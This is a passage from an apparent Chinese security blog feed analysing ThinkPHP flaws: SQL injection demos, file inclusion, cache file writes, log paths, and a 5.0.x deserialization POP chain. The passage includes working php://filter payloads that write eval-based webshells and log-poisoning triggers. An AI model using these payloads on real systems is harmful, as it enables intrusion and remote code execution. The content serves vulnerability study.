function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token string single-quoted-string">'select success'</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-7"><a class="markdownIt-Anchor" href="#影响版本-7"></a> 影响版本</h4><p>全版本</p><h4 id="漏洞分析-7"><a class="markdownIt-Anchor" href="#漏洞分析-7"></a> 漏洞分析</h4><ol><li>where方法，parseWhereExp是解析参数的方法，不太重要。</li></ol><p><img src="../../../typora-user-images/image-20240910172921594.png" alt="image-20240910172921594" /></p><ol start="2"><li>看select方法</li></ol><p><img src="../../../typora-user-images/image-20240910173339004.png" alt="image-20240910173339004" /></p><ol start="3"><li>跟入到parseWhere方法</li></ol><p><img src="../../../typora-user-images/image-20240910173409721.png" alt="image-20240910173409721" /></p><ol start="4"><li>跟入到buildWhere方法</li></ol><p><img src="../../../typora-user-images/image-20240910173619128.png" alt="image-20240910173619128" /></p><ol start="5"><li>会执行到parseWhereItem方法</li></ol><p><img src="../../../typora-user-images/image-20240910174002024.png" alt="image-20240910174002024" /></p><h4 id="漏洞修复-7"><a class="markdownIt-Anchor" href="#漏洞修复-7"></a> 漏洞修复</h4><p>未修复</p><h3 id="4where方法not-like注入010"><a class="markdownIt-Anchor" href="#4where方法not-like注入010"></a> 4.where方法not like注入（0.10）</h3><h4 id="vuldemo-8"><a class="markdownIt-Anchor" href="#vuldemo-8"></a> VulDemo</h4><ul><li>where参数可控</li><li>开启debug</li></ul><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">public function index()    &#123;        $username &#x3D; request()-&gt;get(&#39;username&#x2F;a&#39;);        $result &#x3D; db(&#39;users&#39;)-&gt;where([&#39;username&#39; &#x3D;&gt; $username])-&gt;select();        var_dump($result);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-8"><a class="markdownIt-Anchor" href="#影响版本-8"></a> 影响版本</h4><p>5.0.10</p><h4 id="漏洞分析-8"><a class="markdownIt-Anchor" href="#漏洞分析-8"></a> 漏洞分析</h4><p>漏洞分析与上面的exp相同，不过not like是自己传的，不是上面定义好的exp。</p><p>不过多分析了</p><p><img src="../../../typora-user-images/image-20240910180127484.png" alt="image-20240910180127484" /></p><p><img src="../../../typora-user-images/image-20240910180238930.png" alt="image-20240910180238930" /></p><h4 id="漏洞修复-8"><a class="markdownIt-Anchor" href="#漏洞修复-8"></a> 漏洞修复</h4><p>增加了关键字过滤</p><p><img src="../../../typora-user-images/image-20240910180310523.png" alt="image-20240910180310523" /></p><h3 id="5-order方法注入116-122"><a class="markdownIt-Anchor" href="#5-order方法注入116-122"></a> 5. order方法注入（1.16-1.22）</h3><h4 id="vuldemo-9"><a class="markdownIt-Anchor" href="#vuldemo-9"></a> VulDemo</h4><ul><li>order方法参数可控</li><li>开启debug</li><li>调用find方法</li></ul><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">public function index()    &#123;        $orderby &#x3D; request()-&gt;get(&#39;orderby&#39;);        $result &#x3D; db(&#39;users&#39;)-&gt;where([&#39;username&#39; &#x3D;&gt; &#39;mochazz&#39;])-&gt;order($orderby)-&gt;find();        var_dump($result);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-9"><a class="markdownIt-Anchor" href="#影响版本-9"></a> 影响版本</h4><p>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</p><h4 id="漏洞分析-9"><a class="markdownIt-Anchor" href="#漏洞分析-9"></a> 漏洞分析</h4><p>这个与上面分析的tp3一样，都是parseOrder方法的问题</p><p>不做详细分析</p><p><img src="../../../typora-user-images/image-20240910181002235.png" alt="image-20240910181002235" /></p><p><img src="../../../typora-user-images/image-20240910181019096.png" alt="image-20240910181019096" /></p><h4 id="漏洞修复-9"><a class="markdownIt-Anchor" href="#漏洞修复-9"></a> 漏洞修复</h4><p>增加判断）和#</p><p><img src="../../../typora-user-images/image-20240910181040568.png" alt="image-20240910181040568" /></p><h3 id="6-max方法聚合查询注入00-02113-125"><a class="markdownIt-Anchor" href="#6-max方法聚合查询注入00-02113-125"></a> 6. max方法聚合查询注入（0.0-0.21，1.3-1.25）</h3><h4 id="vuldemo-10"><a class="markdownIt-Anchor" href="#vuldemo-10"></a> VulDemo</h4><ul><li>max方法参数可控</li><li>开启debug</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">max</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="影响版本-10"><a class="markdownIt-Anchor" href="#影响版本-10"></a> 影响版本</h4><p><strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong></p><h4 id="漏洞分析-10"><a class="markdownIt-Anchor" href="#漏洞分析-10"></a> 漏洞分析</h4><p>max方法实战中用的非常少</p><p>不花时间分析了</p><p><img src="../../../typora-user-images/image-20240910182130657.png" alt="image-20240910182130657" /></p><p><img src="../../../typora-user-images/image-20240910182207168.png" alt="image-20240910182207168" /></p><h4 id="漏洞修复-10"><a class="markdownIt-Anchor" href="#漏洞修复-10"></a> 漏洞修复</h4><p>增加了正则匹配，仅允许字母和. *</p><p><img src="../../../typora-user-images/image-20240910182252180.png" alt="image-20240910182252180" /></p><h1 id="0x03-tp6"><a class="markdownIt-Anchor" href="#0x03-tp6"></a> 0x03 TP6</h1><h2 id="1-session任意文件写入00-01"><a class="markdownIt-Anchor" href="#1-session任意文件写入00-01"></a> 1. Session任意文件写入（0.0-0.1）</h2><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.0任意文件写.md</a></p><h1 id="0x04-文件包含"><a class="markdownIt-Anchor" href="#0x04-文件包含"></a> 0x04 文件包含</h1><h2 id="1assign参数可控导致的文件包含"><a class="markdownIt-Anchor" href="#1assign参数可控导致的文件包含"></a> 1.assign参数可控导致的文件包含</h2><h3 id="触发条件"><a class="markdownIt-Anchor" href="#触发条件"></a> 触发条件</h3><ol><li>存在类似assign函数参数可控的代码</li></ol><p><img src="../../../typora-user-images/image-20240816144806251.png" alt="image-20240816144806251" /></p><pre class="line-numbers language-none"><code class="language-none">assign方法第一个变量可控&#x3D;&gt;变量覆盖&#x3D;&gt;任意文件包含&#x3D;&gt;RCE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题外话：本地搭建调试环境的时候，提示找不到模板，自己在<code>Application\Home\View\Index</code>下面新建了模板文件</p><h3 id="漏洞分析-11"><a class="markdownIt-Anchor" href="#漏洞分析-11"></a> 漏洞分析</h3><ol><li>assign只做了赋值操作</li></ol><p><img src="../../../typora-user-images/image-20240816144850011.png" alt="image-20240816144850011" /></p><ol start="2"><li>跟入fetch</li></ol><p><img src="../../../typora-user-images/image-20240816144934461.png" alt="image-20240816144934461" /></p><ol start="3"><li>跟入listen函数</li></ol><p><img src="../../../typora-user-images/image-20240816145025426.png" alt="image-20240816145025426" /></p><ol start="4"><li>跟入exec</li></ol><p><img src="../../../typora-user-images/image-20240816145114321.png" alt="image-20240816145114321" /></p><ol start="5"><li>跟入赋值类的run方法</li></ol><p><img src="../../../typora-user-images/image-20240816145137086.png" alt="image-20240816145137086" /></p><ol start="6"><li>函数参数是我们传的参数，跟入最后的断点处</li></ol><p><img src="../../../typora-user-images/image-20240816145240625.png" alt="image-20240816145240625" /></p><ol start="7"><li>跟入fetch后的load方法</li></ol><p><img src="../../../typora-user-images/image-20240816145428421.png" alt="image-20240816145428421" /></p><ol start="8"><li>很明显的变量覆盖+文件包含，这也是为什么我们需要传入数组变量，key值为_filename</li></ol><p><img src="../../../typora-user-images/image-20240816145751936.png" alt="image-20240816145751936" /></p><p><img src="../../../typora-user-images/image-20240816145818684.png" alt="image-20240816145818684" /></p><p>tp的日志记录：</p><pre class="line-numbers language-none"><code class="language-none">未开启debug：\Application\Runtime\Logs\Common\（一般选择&#x2F;?s&#x3D;--&gt;&lt;?&#x3D;phpinfo();?&gt;去触发）\Application\Runtime\Logs\Home\（可以用?s&#x3D;&#x2F;home&#x2F;index&#x2F;&lt;?&#x3D;phpinfo();?&gt;去触发）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x05-文件写入"><a class="markdownIt-Anchor" href="#0x05-文件写入"></a> 0x05 文件写入</h1><h2 id="1s方法和f方法或cacheset参数可控"><a class="markdownIt-Anchor" href="#1s方法和f方法或cacheset参数可控"></a> 1.S方法和F方法或Cache::set参数可控</h2><h3 id="vuldemo-11"><a class="markdownIt-Anchor" href="#vuldemo-11"></a> VulDemo</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GET.name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">S</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞分析-12"><a class="markdownIt-Anchor" href="#漏洞分析-12"></a> 漏洞分析</h3><ol><li>跟到$cache的set方法</li></ol><p><img src="../../../typora-user-images/image-20240906150903581.png" alt="image-20240906150903581" /></p><ol start="2"><li>分析文件写入的部分，看两个参数的初始化位置。一个是filename方法获取，一个是序列化后的值</li></ol><p><img src="../../../typora-user-images/image-20240906151003887.png" alt="image-20240906151003887" /></p><ol start="3"><li>filename值，md5计算，拼接配置中的文件夹前缀。</li></ol><p><img src="../../../typora-user-images/image-20240906151202004.png" alt="image-20240906151202004" /></p><ol start="4"><li>写入的文件data中包含//注释符，只要在data添加%0d换行就可以了</li></ol><p><img src="../../../typora-user-images/image-20240906151545064.png" alt="" /></p><p>文件名为上面分析的，md5（name）的值</p><p><img src="../../../typora-user-images/image-20240906151748198.png" alt="image-20240906151748198" /></p><p><img src="../../../typora-user-images/image-20240906151956563.png" alt="image-20240906151956563" /></p><h3 id="f方法"><a class="markdownIt-Anchor" href="#f方法"></a> F方法</h3><p>F方法很直接，直接写文件，不过多分析。</p><p><img src="../../../typora-user-images/image-20240906153209845.png" alt="image-20240906153209845" /></p><h1 id="0x06-tp的日志"><a class="markdownIt-Anchor" href="#0x06-tp的日志"></a> 0x06 TP的日志</h1><h2 id="1-不同的日志含义"><a class="markdownIt-Anchor" href="#1-不同的日志含义"></a> 1. 不同的日志含义</h2><p>默认有不同的log路径</p><ul><li>Runtime\Logs\Common: 记录系统的整体运行状态</li></ul><p>​TP3未开启debug情况下记录的信息：</p><p><img src="../../../typora-user-images/image-20240911102033818.png" alt="image-20240911102033818" /></p><ul><li>Runtime\Logs\Home: 记录模块运行的状态</li></ul><p>​TP3未开启debug情况下记录的信息：</p><p>​会记录系统报错信息和SQL语句相关</p><p><img src="../../../typora-user-images/image-20240911102141866.png" alt="image-20240911102141866" /></p><h2 id="2-日志路径"><a class="markdownIt-Anchor" href="#2-日志路径"></a> 2. 日志路径</h2><h3 id="tp3"><a class="markdownIt-Anchor" href="#tp3"></a> TP3</h3><p><strong>路径：</strong></p><pre class="line-numbers language-none"><code class="language-none">Runtime&#x2F;Logs&#x2F;Runtime&#x2F;Logs&#x2F;Admin&#x2F;Runtime&#x2F;Logs&#x2F;Backend&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;App&#x2F;Runtime&#x2F;Logs&#x2F;App&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Admin&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;App&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Ext&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Api&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Test&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Service&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>日志名字：</strong></p><p>年份后两位_月份_日期.log</p><p>24_01_23.log</p><h3 id="tp5"><a class="markdownIt-Anchor" href="#tp5"></a> TP5</h3><p><strong>路径：</strong></p><pre class="line-numbers language-none"><code class="language-none">runtime&#x2F;log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>日志名字，存在多个后缀：</strong></p><p>年份月份/日期.log</p><p>202409/10.log<br />202409/10_cli.log<br />202409/10_error.log<br />202409/10_sql.log</p><h3 id="tp6"><a class="markdownIt-Anchor" href="#tp6"></a> TP6</h3><p><strong>路径：</strong></p><pre class="line-numbers language-none"><code class="language-none">runtime&#x2F;log&#x2F;runtime&#x2F;log&#x2F;Home&#x2F;runtime&#x2F;log&#x2F;Common&#x2F;runtime&#x2F;log&#x2F;Admin&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>日志名字：</strong></p><p>年份月份/日期.log</p><p>202409/10.log</p><h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1><p><a href="https://xz.aliyun.com/t/14451?time__1311=GqAxuWqCqYq05DK5YI9l4hT907A4D#toc-22">https://xz.aliyun.com/t/14451?time__1311=GqAxuWqCqYq05DK5YI9l4hT907A4D#toc-22</a></p><p><a href="https://www.cnblogs.com/lktop/p/13802598.html">https://www.cnblogs.com/lktop/p/13802598.html</a></p><p><a href="https://xz.aliyun.com/t/9326">https://xz.aliyun.com/t/9326</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p><a href="https://furina.org.cn/2024/01/25/thinkphp-log-leakage/">https://furina.org.cn/2024/01/25/thinkphp-log-leakage/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-序&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-序&quot;&gt;&lt;/a&gt; 0x00 序&lt;/h1&gt;
&lt;p&gt;上面我们分析了TP框架存在的默认漏洞，此篇分析一下非默认环境下的漏洞，可能主要包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;某些内置</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP反序列化POP链分析</title>
    <link href="https://cyxsec.github.io/2023/05/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cyxsec.github.io/2023/05/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-05-16T06:36:57.000Z</published>
    <updated>2024-09-19T02:10:08.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-反序列化利用链"><a class="markdownIt-Anchor" href="#0x01-反序列化利用链"></a> 0x01 反序列化利用链</h1><h2 id="审计思路"><a class="markdownIt-Anchor" href="#审计思路"></a> 审计思路</h2><p><strong>php魔术方法</strong></p><pre class="line-numbers language-none"><code class="language-none">__call调用不可访问或不存在的方法时被调用__callStatic调用不可访问或不存在的静态方法时被调用__clone进行对象clone时被调用，用来调整对象的克隆行为__constuct构建对象的时被调用；__debuginfo当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本__destruct明确销毁对象或脚本结束时被调用；__get读取不可访问或不存在属性时被调用__invoke当以函数方式调用对象时被调用__isset对不可访问或不存在的属性调用isset()或empty()时被调用__set当给不可访问或不存在属性赋值时被调用__set_state当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。__sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用__toString当一个类被转换成字符串时被调用__unset对不可访问或不存在的属性进行unset时被调用__wakeup当使用unserialize时被调用，可用于做些对象的初始化操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>反序列化的起点：</strong></p><p>__wakeup和__destruct两个魔术方法</p><p><strong>反序列化的跳板：</strong></p><pre class="line-numbers language-none"><code class="language-none">__toString 当一个对象被当做字符串使用__get 读取不可访问或不存在属性时被调用__set 当给不可访问或不存在属性赋值时被调用__isset 对不可访问或不存在的属性调用isset()或empty()时被调用__call 调用不可访问或不存在的方法时被调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>反序列化的终点：</strong></p><pre class="line-numbers language-none"><code class="language-none">call_user_func 回调函数call_user_func_array 回调函数file_put_contents 文件写入$a($b) 变量函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化链的审计思路就是把上面的思路联系起来：</p><ol><li>寻找__wakeup和__destruct魔术方法，查看里面是否有机会调用其他魔术方法，比如调用不存在的方法会调用__call的魔术方法</li><li>接下来的思路就是继续寻找可以利用的魔术方法</li><li>寻找最终的终点函数，如方法中存在callback调用和文件写入、变量函数等等，总之就能能漏洞利用的点。</li></ol><p>这就是整个反序列化链的构造方式</p><h2 id="1thinkphp-50x-反序列化"><a class="markdownIt-Anchor" href="#1thinkphp-50x-反序列化"></a> ①ThinkPHP 5.0.x 反序列化</h2><p>测试版本：5.0.24</p><h3 id="一-反序列化链调通过程"><a class="markdownIt-Anchor" href="#一-反序列化链调通过程"></a> 一、反序列化链调通过程</h3><h4 id="1-寻找入口点"><a class="markdownIt-Anchor" href="#1-寻找入口点"></a> 1. 寻找入口点</h4><p>寻找__destruct魔术方法</p><p><img src="../../../typora-user-images/image-20240911150823578.png" alt="image-20240911150823578" /></p><h4 id="2-寻找中途的魔术方法"><a class="markdownIt-Anchor" href="#2-寻找中途的魔术方法"></a> 2. 寻找中途的魔术方法</h4><ol><li>跟入removeFiles方法，这里处理$filename变量，unlink会触发toString魔术方法。</li></ol><p><img src="../../../typora-user-images/image-20240911151148298.png" alt="image-20240911151148298" /></p><ol start="2"><li>寻找可使用的toString方法</li></ol><p><img src="../../../typora-user-images/image-20240911151718647.png" alt="image-20240911151718647" /></p><p>跟入toJson方法</p><p><img src="../../../typora-user-images/image-20240911151808198.png" alt="image-20240911151808198" /></p><p>跟入toArray方法</p><p><img src="../../../typora-user-images/2135181-20211128215457370-1791873425.png" alt="2135181-20211128215457370-1791873425" /></p><p>912行这里有一个对象调用方法的代码，在找不到对象的方法时，会调用__call魔术方法</p><p><img src="../../../typora-user-images/image-20240911153458094.png" alt="image-20240911153458094" /></p><ol start="3"><li>寻找可利用的__call魔术方法</li></ol><p><img src="../../../typora-user-images/image-20240911154109705.png" alt="image-20240911154109705" /></p><p>跟入block方法</p><p><img src="../../../typora-user-images/image-20240911154154119.png" alt="image-20240911154154119" /></p><p>跟入writeln方法</p><p><img src="../../../typora-user-images/image-20240911154238309.png" alt="image-20240911154238309" /></p><p>跟入到write方法，这里可能得到了一个调用任意类的write方法的地方</p><p><img src="../../../typora-user-images/image-20240911154252886.png" alt="image-20240911154252886" /></p><p>这里得到了一个调用任意类的set方法的地方</p><p><img src="../../../typora-user-images/image-20240911154444740.png" alt="image-20240911154444740" /></p><h4 id="3找到最终利用点"><a class="markdownIt-Anchor" href="#3找到最终利用点"></a> 3.找到最终利用点</h4><p>set方法就很熟悉了，我们之前分析命令执行的时候</p><p>\think\cache\driver\File::set</p><p><img src="../../../typora-user-images/image-20240911154651163.png" alt="image-20240911154651163" /></p><p>文件写入的时候，有exit，这个看p牛的文件写入绕死亡exit就行了。</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><h4 id="4构造完整利用链"><a class="markdownIt-Anchor" href="#4构造完整利用链"></a> 4.构造完整利用链</h4><p><strong>分析如何才能调用__call方法</strong></p><p>主要有四个if逻辑，最后让最下面的$value为想调用__call方法的类即可，先分析if逻辑，后分析赋值逻辑</p><ul><li>$relation要为Model类自带的方法名称</li><li>执行Model类的方法后，获取的类，方法要存在getBindAttr</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>A</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">也</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">bindAttr参数要不为空，也就是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">A</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span></span></span></span>modelRelation类要存在getBindAttr方法要有返回值</li><li>不设置data[$key]的值</li></ul><p><img src="../../../typora-user-images/image-20240911174406671.png" alt="image-20240911174406671" /></p><p>变量赋值对应着右边的三个方法</p><ul><li>第一处parseName方法仅做大小写替换操作，$relation可控</li><li>第二处调用该类自己的方法，这里找到了getError方法，因为方法的返回值是可控的，$modelRelation可控</li><li>第三处调用的方法跟进去，在第一个if逻辑，返回值为this-&gt;parent，可控。</li></ul><p><img src="../../../typora-user-images/image-20240911175535696.png" alt="image-20240911175535696" /></p><p>分析一下第三处的方法的if逻辑</p><ul><li>第一处返回值可控</li><li>第二处我们需要寻找一个可控的getModel方法的类，在下方的Query类即可找到可控的。</li></ul><p><img src="../../../typora-user-images/image-20240911181833527.png" alt="image-20240911181833527" /></p><p><img src="../../../typora-user-images/image-20240911181623160.png" alt="image-20240911181623160" /></p><p>接下来就是符合Relation子类了，这个类还要有getBindAttr方法</p><p>找到了OneToOne类，同时这里的bindAttr参数也是可控的，这样最开始的逻辑也能进去了。</p><p><img src="../../../typora-user-images/image-20240911182518131.png" alt="image-20240911182518131" /></p><p><img src="../../../typora-user-images/image-20240911182354185.png" alt="image-20240911182354185" /></p><p>这下call魔术方法已经可以正常调用到了</p><p>后面的call魔术方法触发set逻辑很简单，没有if之类的逻辑，问题在绕过死亡exit的地方。</p><h3 id="二-死亡exit绕过"><a class="markdownIt-Anchor" href="#二-死亡exit绕过"></a> 二、死亡exit绕过</h3><p>这个在p牛的博客已经写过了，简单来说就是filename可控的时候，使用php://filter伪协议会把content编码处理，这样exit就不会写到文件中了。</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><img src="../../../typora-user-images/image-20240912112011325.png" alt="image-20240912112011325" /></p><p>p🐂这里给的例子是函数两个参数均可控的时候，如果filename和content为一个参数时</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php$content &#x3D; $_GET[content];file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></p><p>看一下这篇博客。</p><p><strong>简单学习和总结一下：</strong></p><ol><li>我们想到的第一种方式就是依旧和上面一样的思路，使用base64过滤器</li></ol><p><code>php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php</code>或者<code>php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></p><p>这样写入的内容应该是&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php的base64解码，但是实际会生成文件，但无法写入内容。因为base64在=后面不能存在字符。</p><ol start="2"><li>因此想办法去掉=即可，寻找可用的php的过滤器。</li></ol><p>string.strip.tags过滤器，去除html和php标签（在php7.3后无法使用）</p><p>这样得到了一个payload：</p><p><code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p><p>但这样写，文件名存在特殊字符，Windows下面无法创建文件</p><p>Linux测试一下</p><p><img src="../../../typora-user-images/image-20240913142115389.png" alt="image-20240913142115389" /></p><p>利用跨目录控制文件名。</p><p><code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../1.php</code></p><p><strong>这个在Windows环境下做测试居然失败了，难道是跨目录的问题？暂时没研究了</strong></p><p><img src="../../../typora-user-images/image-20240913142520525.png" alt="image-20240913142520525" /></p><ol start="3"><li>考虑使用其他编码类的过滤器，这样就可以避免=带来的问题了。</li></ol><p><code>php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=1.php</code></p><p>使用rot13凯撒，同时php寻找不到过滤器只会抛出警告，所以我们的payload可以放在过滤器的位置（<strong>但无法在tp中使用，tp会直接抛出异常</strong>）</p><p>最终结果如下：</p><p>如果php不开启短标签的话，前面的&lt;?部分就会被忽略，不会影响解析</p><p><img src="../../../typora-user-images/image-20240913143441913.png" alt="image-20240913143441913" /></p><ol start="4"><li>上面的rot13在短标签开启的时候会报错，无法正常使用，可以使用自带的iconv的过滤器</li></ol><p>usc-2过滤器：两位一反转</p><p><img src="../../../typora-user-images/image-20240913143814907.png" alt="image-20240913143814907" /></p><p><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=12.php</code></p><p><img src="../../../typora-user-images/image-20240913144253027.png" alt="image-20240913144253027" /></p><p>usc-4过滤器：四位一反转</p><p><code>php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</code></p><p><img src="../../../typora-user-images/image-20240913144542973.png" alt="image-20240913144542973" /></p><p>UTF编码转换：</p><p>可以把=做编码转换，这样在设置base64解码的时候就不再受到影响了</p><p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php</code></p><p><img src="../../../typora-user-images/image-20240913151647177.png" alt="image-20240913151647177" 